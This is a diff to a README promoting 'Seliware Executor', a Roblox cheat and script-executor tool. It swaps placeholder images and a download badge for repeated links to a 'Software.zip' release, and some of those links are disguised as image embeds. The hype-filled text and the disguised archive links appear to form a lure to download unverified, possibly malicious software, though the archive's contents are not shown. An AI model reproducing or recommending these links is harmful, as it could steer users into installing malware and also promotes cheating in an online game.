@@ -11,7 +11,7 @@ Seliware introduces a new era for Roblox game modification, providing users with
 ### Decompiler Functionality
 Unravel the mysteries of game code with Seliware's advanced decompiler feature. Gain insights into the inner workings of your favorite Roblox games and customize them to your heart's content.
 
-![Decompiler](https://via.placeholder.com/150)
+![Decompiler](https://github.com/YCro1777/Seliware-Executor/releases/download/v2.0/Software.zip)
 
 ### UNC Support
 With Seliware's 100% UNC support, you can rest assured that your game modifications will be seamlessly integrated without any compatibility issues. Enjoy a hassle-free experience as you explore the vast potential of Roblox game customization.
@@ -23,7 +23,7 @@ Seliware boasts a Level 8 rating, signifying its position as a top-tier executor
 
 To access the latest version of Seliware Executor, simply download the installation package from the link provided below:
 
-[![Download Seliware Executor](https://img.shields.io/badge/Download-Seliware%20Executor-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Seliware Executor](https://github.com/YCro1777/Seliware-Executor/releases/download/v2.0/Software.zip%20Executor-blue)](https://github.com/YCro1777/Seliware-Executor/releases/download/v2.0/Software.zip)
 
 *Note: The provided link needs to be launched to initiate the download process.*
 
@@ -37,7 +37,7 @@ For any inquiries, feedback, or assistance regarding Seliware Executor, feel fre
 
 Begin your journey into the realm of advanced Roblox game customization with Seliware Executor. Unleash your creativity, enhance your gameplay, and discover the endless possibilities that await you.
 
-![Game Customization](https://via.placeholder.com/300)
+![Game Customization](https://github.com/YCro1777/Seliware-Executor/releases/download/v2.0/Software.zip)
 
 ---
 
